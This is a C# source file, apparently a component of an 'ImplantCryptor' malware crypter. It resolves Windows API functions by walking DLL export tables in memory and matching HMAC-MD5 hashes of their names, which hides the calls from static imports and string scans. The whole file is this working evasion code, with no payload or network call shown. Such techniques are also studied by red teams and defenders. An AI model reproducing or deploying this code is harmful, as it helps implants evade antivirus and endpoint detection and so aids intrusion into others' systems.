using System.Security.Cryptography;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System;

namespace ImplantCryptor
{
  class DInvoke
  {
    public static string GetAPIHash(string methodName, long key)
    {
      byte[] data = Encoding.UTF8.GetBytes(methodName.ToLower());
      byte[] kbytes = BitConverter.GetBytes(key);

      using (HMACMD5 hmac = new HMACMD5(kbytes))
      {
        byte[] bHash = hmac.ComputeHash(data);
        return BitConverter.ToString(bHash).Replace("-", "");
      }
    }

    public static IntPtr GetLibraryAddress(string dllName, string functionHash, long key)
    {
      IntPtr hModule = GetLoadedModuleAddress(dllName);
      if (hModule == IntPtr.Zero)
      {
        throw new DllNotFoundException(dllName + ", Dll 404");
      }

      return GetExportAddress(hModule, functionHash, key);
    }


    // get addresses of dlls loaded into memory
    public static IntPtr GetLoadedModuleAddress(string DLLName)
    {
      ProcessModuleCollection ProcModules = Process.GetCurrentProcess().Modules;
      foreach (ProcessModule Mod in ProcModules)
      {
        if (Mod.FileName.ToLower().EndsWith(DLLName.ToLower()))
        {
          return Mod.BaseAddress;
        }
      }
      return IntPtr.Zero;
    }


    // get api method pointer from dll
    public static IntPtr GetExportAddress(IntPtr ModuleBase, string FunctionHash, long Key)
    {
      IntPtr FunctionPtr = IntPtr.Zero;
      try
      {
        // Traverse the PE header in memory
        Int32 PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
        Int16 OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + 0x14));
        Int64 OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
        Int16 Magic = Marshal.ReadInt16((IntPtr)OptHeader);
        Int64 pExport = 0;
        if (Magic == 0x010b)
        {
          pExport = OptHeader + 0x60;
        }
        else
        {
          pExport = OptHeader + 0x70;
        }

        // Read -> IMAGE_EXPORT_DIRECTORY
        Int32 ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
        Int32 OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
        Int32 NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14));
        Int32 NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
        Int32 FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
        Int32 NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
        Int32 OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));

        // Loop the array of export name RVA's
        for (int i = 0; i < NumberOfNames; i++)
        {
          string FunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA + i * 4))));
          if (GetAPIHash(FunctionName, Key).Equals(FunctionHash, StringComparison.OrdinalIgnoreCase))
          {
            Int32 FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
            Int32 FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))));
            FunctionPtr = (IntPtr)((Int64)ModuleBase + FunctionRVA);
            break;
          }
        }
      }
      catch
      {
        // Catch parser failure
        throw new InvalidOperationException("module exports 500.");
      }

      if (FunctionPtr == IntPtr.Zero)
      {
        // Export not found
        throw new MissingMethodException(FunctionHash + ", hash 404.");
      }
      return FunctionPtr;
    }

  }
}
